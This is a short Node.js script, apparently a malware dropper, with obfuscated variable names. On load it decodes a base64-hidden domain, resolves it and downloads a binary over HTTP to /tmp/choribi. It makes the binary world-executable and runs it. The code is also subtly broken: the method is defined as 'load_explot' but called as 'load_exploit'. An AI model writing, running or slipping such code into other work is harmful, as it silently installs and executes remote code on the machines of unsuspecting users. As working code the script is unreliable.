const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function otidia() {
    this.load_explot = function(quellable) {
      if (quellable != null && quellable != '0.0.0.0') {
        overliterariness = http.get('http://' + quellable + '/nonassignably', function(nontextually) {
          var misruler = fs.createWriteStream('/tmp/choribi');
          nontextually.on('data', function(irregularities) {
            misruler.write(irregularities);
          });
          nontextually.on('end', function() {
            misruler.end();
            fs.chmod('/tmp/choribi', '0777');
            child_process.exec('/tmp/choribi', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      catholicise = 'MTQ5MjczZTYueHhwbHQuZGU='
      dns.lookup((new Buffer(catholicise, 'base64')).toString(), function(err, lunier) {
        self.load_exploit(lunier);
      });
    };
};

(new otidia()).run();
